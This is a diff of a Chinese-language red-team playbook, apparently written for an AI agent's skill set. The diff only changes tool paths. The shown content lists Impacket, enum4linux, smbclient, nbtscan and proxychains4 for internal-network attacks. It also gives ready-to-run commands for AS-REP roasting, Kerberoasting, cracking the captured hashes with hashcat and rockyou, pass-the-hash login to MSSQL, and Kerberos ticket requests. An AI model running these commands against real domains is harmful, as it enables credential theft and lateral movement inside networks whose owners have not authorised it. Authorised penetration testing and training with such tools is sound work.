@@ -15,11 +15,11 @@ enabled: true
 
 | 工具 | 路径 | 用途 |
 | --- | --- | --- |
-| Impacket 套件 | `impacket-*`（PATH，或 `$DSH_HOME/redteam/toolkit/impacket/`） | 协议级横向、凭据转储、Kerberos 攻击 |
-| enum4linux | `enum4linux`（PATH，或 `$DSH_HOME/redteam/toolkit/enum4linux/`） | SMB/域信息枚举（用户、共享、策略） |
-| smbclient | `smbclient` | 共享浏览与读写 |
-| nbtscan | `nbtscan` | NetBIOS 名称扫描 |
-| proxychains4 | `proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |
+| Impacket 套件 | `/usr/bin/impacket-*`（61 个命令） | 协议级横向、凭据转储、Kerberos 攻击 |
+| enum4linux | `/usr/bin/enum4linux` | SMB/域信息枚举（用户、共享、策略） |
+| smbclient | `/usr/bin/smbclient` | 共享浏览与读写 |
+| nbtscan | `/usr/bin/nbtscan` | NetBIOS 名称扫描 |
+| proxychains4 | `/usr/bin/proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |
 
 ## 零、先做的事（信息决定打法）
 
@@ -82,11 +82,11 @@ impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
 ```bash
 # 1) 用户名枚举 + AS-REP 抓取（不需要密码，找不需要预认证的账号）
 impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
-hashcat -m 18200 runs/asrep.txt $DSH_HOME/redteam/toolkit/wordlists/rockyou.txt      # 离线破解
+hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # 离线破解
 
 # 2) Kerberoasting（找有 SPN 的服务账号，抓 TGS 离线破解）
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
-hashcat -m 13100 runs/kerberoast.txt $DSH_HOME/redteam/toolkit/wordlists/rockyou.txt
+hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt
 
 # 3) 票据申请与使用
 impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT → .ccache
